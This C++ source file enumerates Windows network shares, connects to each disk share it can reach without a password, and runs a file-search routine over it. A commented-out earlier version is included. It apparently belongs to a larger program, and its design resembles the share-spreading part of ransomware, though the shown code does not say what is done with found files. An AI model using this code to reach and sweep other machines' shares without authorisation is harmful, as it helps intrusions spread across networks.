#include "shares.h"
#include "FileSearch.h"

static VOID traverse_shares(LPNETRESOURCEW lpnr, search_api::search_parameter *search_param)
{
	
	DWORD dwResult, dwResultEnum, cbBuffer = 16384, cEntries = -1;
	HANDLE hEnum = NULL;
	LPNETRESOURCEW lpnrLocal = nullptr;
	
	DWORD dwRequiredSize = 0;
	BOOL bConnected = TRUE;
	do
	{
		if (WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, lpnr, &hEnum) != NO_ERROR)
			break;

		lpnrLocal = (LPNETRESOURCEW)new BYTE[cbBuffer + 1];
		if (!lpnrLocal)
			break;
		
		dwRequiredSize = cbBuffer;
		
		dwResultEnum = WNetEnumResourceW(hEnum, &cEntries, lpnrLocal, &dwRequiredSize);
		// проверим достаточный ли размер массива
		if ((dwRequiredSize > cbBuffer) && (dwResultEnum == ERROR_MORE_DATA))
		{
#ifdef _DEBUG
			WriteLog(L"[traverse_shares] too much network resources, need bigger buffer, reallocating...");
#endif
			delete[]lpnrLocal;
			lpnrLocal = (LPNETRESOURCEW)new BYTE[dwRequiredSize + 1];
			if (lpnrLocal != nullptr)
			{
				cEntries = -1;
				dwResultEnum = WNetEnumResourceW(hEnum, &cEntries, lpnrLocal, &dwRequiredSize);
			}
		}

		if (dwResultEnum != NO_ERROR)
			break;

		for (UINT iIndex = 0; iIndex < cEntries; iIndex++)
		{
			if (RESOURCEUSAGE_CONTAINER == (lpnrLocal[iIndex].dwUsage & RESOURCEUSAGE_CONTAINER))
			{
#ifdef _DEBUG
				WriteLog(L"[traverse_shares] trying to scan container: ", lpnrLocal[iIndex].lpRemoteName);
#endif
				traverse_shares(&lpnrLocal[iIndex], search_param);
			}
			else if (RESOURCETYPE_DISK == (lpnrLocal[iIndex].dwUsage & RESOURCETYPE_DISK))
			{
#ifdef _DEBUG
				WriteLog(L"[traverse_shares] trying to connect: ", lpnrLocal[iIndex].lpRemoteName);
#endif
				bConnected = FALSE;
				if (WNetAddConnectionW(lpnrLocal[iIndex].lpRemoteName, NULL, NULL) != ERROR_INVALID_PASSWORD)
				{
					UINT uRemoteLen = wcslen(lpnrLocal[iIndex].lpRemoteName);

					PWCHAR pwTraversePath = new WCHAR[uRemoteLen + 12];
					if (pwTraversePath)
					{
						wcscpy(pwTraversePath, lpnrLocal[iIndex].lpRemoteName);
						if (pwTraversePath[uRemoteLen - 1] != L'\\')
							wcscat(pwTraversePath, L"\\");

#ifdef _DEBUG
						WriteLog(L"[traverse_shares] share found: ", pwTraversePath);
#endif
						
						search_param->pwEntrySearch = pwTraversePath;
						search_api::search(search_param);

						search_param->pwEntrySearch = nullptr;
						delete[]pwTraversePath;
					}

					WNetCancelConnectionW(lpnrLocal[iIndex].lpRemoteName, FALSE);
				}
			}
		}


	} while (FALSE);

	if (lpnrLocal != nullptr)
		delete[]lpnrLocal;

	if (hEnum != NULL)
		WNetCloseEnum(hEnum);

	

	return; 
}

/*
static VOID traverse_shares(LPNETRESOURCEW lpnr, search_api::search_parameter *search_param)
{
	DWORD dwResult, dwResultEnum, cbBuffer = 16384, cEntries = 0xFFFFFFFF;
	HANDLE hEnum;
	LPNETRESOURCEW lpnrLocal;
	dwResult = WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, lpnr, &hEnum);
	if (dwResult != NO_ERROR)
	{
		return;
	}
	do
	{
		lpnrLocal = (LPNETRESOURCEW)new BYTE[cbBuffer];
		if (!lpnrLocal) {
			WNetCloseEnum(hEnum);
			return;
		}
		dwResultEnum = WNetEnumResourceW(hEnum, &cEntries, lpnrLocal, &cbBuffer);
		if (dwResultEnum == NO_ERROR)
		{
			for (DWORD i = 0; i < cEntries; i++)
			{
				if (RESOURCEUSAGE_CONTAINER == (lpnrLocal[i].dwUsage & RESOURCEUSAGE_CONTAINER))
				{
#ifdef _DEBUG
					WriteLog(L"[traverse_shares] trying to scan container: ", lpnrLocal[i].lpRemoteName);
#endif
					traverse_shares(&lpnrLocal[i], search_param);
				}
				else if (RESOURCETYPE_DISK == (lpnrLocal[i].dwUsage & RESOURCETYPE_DISK))
				{
#ifdef _DEBUG
					WriteLog(L"[traverse_shares] trying execute search: ", lpnrLocal[i].lpRemoteName);
#endif
					if (WNetAddConnectionW(lpnrLocal[i].lpRemoteName, NULL, NULL) != ERROR_INVALID_PASSWORD)
					{
						UINT uRemoteLen = wcslen(lpnrLocal[i].lpRemoteName);

						PWCHAR pwTraversePath = new WCHAR[uRemoteLen + 12];
						if (pwTraversePath)
						{
							wcscpy(pwTraversePath, lpnrLocal[i].lpRemoteName);
							if (pwTraversePath[uRemoteLen - 1] != L'\\')
								wcscat(pwTraversePath, L"\\");

#ifdef _DEBUG
							WriteLog(L"[traverse_shares] share found: ", pwTraversePath);
#endif
							/*
							search_param->pwEntrySearch = pwTraversePath;
							search_api::search(search_param);

							delete[]pwTraversePath;
							search_param->pwEntrySearch = nullptr;
							*/

/*
						}
						WNetCancelConnectionW(lpnrLocal[i].lpRemoteName, FALSE);
					}

				}
			}
		}
		else if (dwResultEnum != ERROR_NO_MORE_ITEMS)
		{
			break;
		}

		delete[]lpnrLocal;

	} while (dwResultEnum != ERROR_NO_MORE_ITEMS);

	WNetCloseEnum(hEnum);
	return;
}
*/

DWORD WINAPI shares::enumerate(LPVOID lpParameter)
{
#ifdef _DEBUG
	WriteLog(L"[shares::enumerate] enumerating shares... ");
#endif

	blob *pbParameter = (blob*)lpParameter;
	if (pbParameter == nullptr)
	{
#ifdef _DEBUG
		WriteLog(L"[shares::enumerate] invalid parameter [1]");
#endif
		return -1;
	}

	search_api::search_parameter *param = (search_api::search_parameter*)pbParameter->lpBuffer;
	if (param == nullptr)
	{
#ifdef _DEBUG
		WriteLog(L"[shares::enumerate] invalid parameter [2]");
#endif
		return -1;
	}

	if (pbParameter->dwBufSize != sizeof(search_api::search_parameter))
	{
#ifdef _DEBUG
		WriteLog(L"[shares::enumerate] invalid parameter [3]");
#endif
		return -1;
	}

	traverse_shares(nullptr, param);

	return 0;
}
